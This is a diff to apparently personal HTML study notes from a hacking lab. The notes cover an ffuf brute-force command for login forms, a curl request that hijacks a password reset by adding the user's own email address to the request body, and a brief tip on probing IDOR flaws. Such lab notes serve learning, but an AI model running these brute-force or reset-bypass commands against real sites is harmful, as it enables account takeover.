@@ -63,7 +63,10 @@
       <b>Explaination:</b> the <b>-w </b> for wordlist. The <b>-X </b>for request method,GET request by default. The <b>-d </b>for data.In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The<b> -H </b> for additional headers.The <b>-u</b> for URL, the <b>-mr</b> for error message.</ol><br>
       <ol><b>Username & Password Brute-force: </b> ffuf -w [username_wordlist]:W1,[password_wordlist]:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u [login_url] -fc 200</ol>
     </ol>
-
+    <p><b>Bypassing reset email vulnability</b></p>
+    curl 'http://10.10.109.51/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
+    <h2><li>IDOR vulnerabilities</li></h2>
+    IDOR vulnerabilities: change url info and see it vulnerable or not. url maybe encoded(base64).
   </div>
 </body>
 </html>           
